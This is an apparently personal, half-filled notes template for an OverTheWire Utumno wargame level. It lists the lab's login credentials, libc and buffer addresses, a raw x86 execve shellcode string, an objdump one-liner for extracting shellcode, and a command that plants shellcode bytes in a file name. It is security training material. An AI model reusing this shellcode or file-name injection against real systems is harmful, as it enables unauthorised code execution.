---
tags:
  - ctf
created: 2026-06-24
---
4
# `Level [1]` 
> 

## 🔐 Connection data

| Parameter | Value                       |
| --------- | --------------------------- |
| Host      | utumno.labs.overthewire.org |
| Port      | 2227                        |
| Login     | utumno1                     |
| Password  | g0Vpiw3aZt                  |

## 🎯 Task of the level
- craft shellcode with sh_ file name to make it valid and get shell
## 🎯 Information

| Type of information | Data                               |
| ------------------- | ---------------------------------- |
| vuln func           | #strc                              |
| strcmp compare      | #strcmp comrape with `s            |
| /bin/sh address     | `0xf7f3bde8`<br>`\xe8\xbd\xf3\xf7` |
| system address      | `0xf7dce8e0`<br>`\xe0\xe8\xdc\xf7` |
|                     |                                    |
| esp addr for arg2   | 0xffffd4b8                         |
| buffer address      | `0x804c05a`                        |
`\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
## 🎯 Tools

| Tool | Destination | Usage |
| ---- | ----------- | ----- |
|      |             |       |
## 📚 Key commands/technics

| Coomand                                                                                                                                                                                                               | Desctiption |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- |
| `objdump -d ./shellcode.o \| grep '[0-9a-f]:' \| grep -v 'file' \| cut -f2 -d: \| cut -f1-6 -d' ' \| tr -s ' ' \| tr '\t' ' ' \| sed 's/ $//g' \| sed 's/ /\\x/g' \| paste -d '' -s \| sed 's/^/"/' \| sed 's/$/"/g'` |             |
|                                                                                                                                                                                                                       |             |
|                                                                                                                                                                                                                       |             |

## 💡 Step by step

| Step | Action | Information |
| ---- | ------ | ----------- |
| 1    |        |             |
| 2    |        |             |
| 3    |        |             |

## 🔍 Result
Flag:

## 🚪 Travel
-> [Utumno_1]

## 🔗 Link
- [Название ресурса](URL)
`!touch sh_$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xd5\x58\x58\xd5\xff\xff\x58\xd5")')`